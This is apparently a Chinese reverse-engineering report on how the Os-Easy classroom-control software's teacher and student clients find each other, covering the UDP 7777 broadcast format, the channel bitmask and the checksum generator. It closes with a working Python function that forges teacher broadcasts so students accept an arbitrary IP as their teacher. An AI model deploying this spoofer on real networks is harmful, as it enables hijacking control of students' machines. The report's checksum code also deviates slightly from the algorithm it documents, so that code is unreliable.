# 01 教师发现机制与广播
 
 > 本文汇总 Os-Easy 教学系统"教师端/学生端相互发现"机制的完整分析：
 > 发现通道、7777 广播报文、channel 编码、7771 扫描、屏幕广播（7778）、频道注册。
 > 数据来源：样本静态分析（Ghidra x86 反编译，8 模块约 256 万行）+ 现场抓包（09-12 / 09-14 / 09-15）。
 > 首次分析：2026-09-15 · 本轮字节级证据补强：2026-10-23（构造点/定时器/WSASendTo/误匹配澄清全部坐实）

## 一、发现机制总览

系统采用**多通道发现机制**，教师端同时做以下事情（由定时器驱动）：

```
教师端 ──① UDP 广播(7777)    ──> 局域网内所有学生端     （每 3 秒）
教师端 ──② UDP 组播(7771) "teacher" ──> 频道扫描          （每 ~0.11 秒）
教师端 ──③ HTTP 注册          ──> 中心注册服务器(channel_register)
学生端 ──④ HTTP 匹配          ──> http://IP:port/channel_match
```

## 二、① 7777 教师身份广播

### 2.1 触发与发送链路（静态分析，已逐点坐实）

`MainLogic.dll` 网络组件初始化块注册一簇窗口定时器（`SetTimer` 回调统一为 `FUN_100773b0`，main@99117-99175），其中 **id=4 的 3000ms 定时器**（`SetTimer(0,4,3000,FUN_100773b0)`，main@99147，句柄存 `this+0x5e8`）驱动 7777 广播，且紧随配置键 `ChannleScanPort` 读取（main@99130）。

发送链路（本轮逐点坐实）：
1. 定时器 id=4 回调 **`FUN_100773b0`**（定义 main@110486）是**薄分发器**：仅 `if (DAT_10190180) FUN_10067fc0(DAT_10190180, param_3)`，把 timer id 转交给 **`FUN_10067fc0`（定义 main@100952）** 按 id 走分支（`this+0x5d8/0x5dc/0x5e0/…` 与各 id 比对，id=4 → 广播）；
2. 广播分支调用 **`FUN_1005ae30`（RVA `0x1005ae30`，定义 main@92813，函数体 main@92820-92880）** 构造广播 JSON（main@101172 处调用）；
3. 经 **`WSASendTo`**（封装函数 `FUN_10096640`，main@140719）发往 `255.255.255.255 : ChannleScanPort`。

**广播权限（`SO_BROADCAST`）已坐实**：socket 在 `ChannelSender::Initialize` 中配置，调用 `setsockopt(s, SOL_SOCKET, 0x20/*SO_BROADCAST*/, &1, 4)`（main@13415-13420，失败分支打印 `"ChannelSender::Initialize::setsockopt failed with error: %d"` main@13432）。option 以**裸数值 `0x20`** 出现，故全文搜 `SO_BROADCAST` 字样零命中。

> 端口 7777 **并非硬编码**：反编译中 `7777` 的"命中"均为误匹配（如 `FUN_00477770`、`-0x77777777`、`@00437777`），真实端口值来自配置键 `ChannleScanPort`。

### 2.2 报文内容

```json
{
   "channel" : 4,
   "checksum" : 54503,
   "msg_id" : "teacherip",
   "teacher_ip" : "192.168.5.18"
}
```

构造顺序（`FUN_1005ae30` 反编译，main@92820-92880，逐行坐实）：

```c

FUN_1012d050(local_34,"checksum");     // 值 = FUN_1004c380→get()（6位奇偶位锁定随机数）   main@92855
FUN_1012d050(local_34,"channel");      // 值 = *(local_14+0x3c)（频道位掩码）      main@92863
```

## 五、channel 编码规律（位掩码）

### 5.1 实测值（09-14 / 09-15 抓包）

| 教师机 IP | channel 值 | 二进制 |
|---|---|---|
| `192.168.0.200` | 2 | `0000 0010` |
| `192.168.1.200` | 4 | `0000 0100` |
| `192.168.2.200` | 8 | `0000 1000` |
| `192.168.3.200` | 16 | `0001 0000` |
| `192.168.1.57` | 640 | `10 1000 0000` |
| `192.168.5.18` | 4 | `0000 0100` |

### 5.2 规律

| channel | 表达式 | 置位 bit | 对应频道号 |
|---|---|---|---|
| 2 | `2^1` | bit 1 | 1 |
| 4 | `2^2` | bit 2 | 2 |
| 8 | `2^3` | bit 3 | 3 |
| 16 | `2^4` | bit 4 | 4 |

即 **`channel值 = 2^(频道号)`**（第 N 频道 → `1 << N`）。

> **幂次方规律已由抓包坐实**（本轮，17 个 log / 327 条记录）：`channel` 取值仅 `2/4/8/16`，**全部是 2 的幂**——2(140次)→频道1、4(138次)→频道2、8(29次)→频道3、16(20次)→频道4。本轮抓包均为单频道（故全是单一幂）。

多频道叠加：

```
640 = 512 + 128 = 2^9 + 2^7  →  频道 7 + 频道 9
```

**结论：`channel` 为位掩码，一位代表一个频道，可多频道叠加。**

```
channel值 = Σ (1 << 频道号)
```

### 5.3 与配置对照

样本 `skin/core.conf`：

```
/channel/2/       → 频道号 = 2
/multichannel/1/  → 多频道支持开启
```

- 配置频道号 2 → `channel值 = 1 << 2 = 4`
- 与 `192.168.1.200` 实测广播值 4 一致。

> 即：界面/配置中的"频道号"与广播中的 "channel 值" 不同，后者为位编码值。详见 [13 号报告](./13_频道与机房隔离机制.md)。

### 5.4 checksum 字段

同一教师机、同一 channel，checksum 每次不同（如 `212727` / `12303` / `672303` / `432763`）。
其值随广播变化，**与 IP 无关**，非完整性校验，是每次广播掷出的新鲜随机 token。

**生成算法已由 `FUN_1004c380`（main@74790）逐字节坐实**——"6 位奇偶位锁定随机数"：

```c
*param_1 = 0;
for (i = 0; i < 6; i++) {
    *param_1 = *param_1 * 10;
    d = rand() & 3;                 // d ∈ {0,1,2,3}
    if (i & 1)  *param_1 += 1 + d*2; // 奇数位(i=1,3,5) → {1,3,5,7}
    else        *param_1 += d*2;      // 偶数位(i=0,2,4) → {0,2,4,6}
}
```

即从左起第 0/2/4 位 ∈ {0,2,4,6}（偶），第 1/3/5 位 ∈ {1,3,5,7}（奇）。
**当最高位恰好为 0，JSON 序列化丢前导零 → 显示成 5 位**（如 `36165` 实为 `036165`）。
本轮 40 个抓包样本（补 6 位后）**无一例外全部吻合**。生成规则详见 [07 报告](./07_建议点深挖.md)。

## 八、学生端如何找到教师端

1. 学生端监听 `ChannleScanPort`（7777）UDP 广播，收到后解析 `teacher_ip` + `channel`；
2. `StudentLogic.dll` 中 `get teacherip : %s`、`IpProto:%d,teacherip:%s` 记录教师 IP；
3. 也可通过 HTTP `http://IP:port/channel_match` 主动匹配频道；
4. 频道→班级映射缓存于 `channeltoclass.cache`（`ChannelToClass::Load/Save`）。

### 教师/学生 IP 的记录

- 教师端广播的是**自己的 IP**（`teacher_ip`）；
- 学生端收到 `set-teaAndStu-ip` 指令后，在 MMPC 内存结构记录 `teaIp`/`stuIp`（日志 `teaIp:192.168.1.200,stuIp:192.168.1.64`）；
- 教师 IP 后续用于启动 `MultiClient.exe 教师IP 学生IP` 等操作的参数，**并非用于鉴权**（见 [02 号报告](./02_行为管控指令.md) / [07 报告](./07_建议点深挖.md)）。

## 九、对工具开发的指导

| 目标 | 依据 |
|---|---|
| 伪造教师广播 | 需复刻 7777 报文：`{"channel":N,"checksum":动态,"msg_id":"teacherip","teacher_ip":"<伪造IP>"}` |
| 是否需伪造 7777 | 若目标学生已连教师端，仅发管控报文即可；若要"无教师端环境下让学生认为有教师"，需伪造 7777 |
| channel 取值 | 必须发**位编码值**（如 2 频道 → 4），详见第五节 |
| checksum | 每次变化，不可固定 |
| 组播地址 | 7771 用 `229.9.<ip3>.<ip4>`；屏幕 7778 用 `229.1.<ip3>.<ip4>` |

### 7777 伪造示例（Python）

```python
import socket, json, random

def fake_teacher_broadcast(channel, teacher_ip, times=1, interval=3):
    for _ in range(times):
        # checksum：6 位十进制（奇位奇、偶位偶，见 07 报告）
        checksum = 0
        for i in range(6):
            base = random.randint(0, 9)
            checksum = checksum * 10 + (base if base % 2 == i % 2 else (base + 1) % 10)
        msg = json.dumps({
            "channel": channel,
            "checksum": checksum,
            "msg_id": "teacherip",
            "teacher_ip": teacher_ip
        }, indent=3, ensure_ascii=False)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.sendto(msg.encode('utf-8'), ("255.255.255.255", 7777))
        s.close()
```

> checksum 格式（5 位 vs 6 位）会影响报文长度（105 vs 106），学生端可能校验位数，建议完整实现。
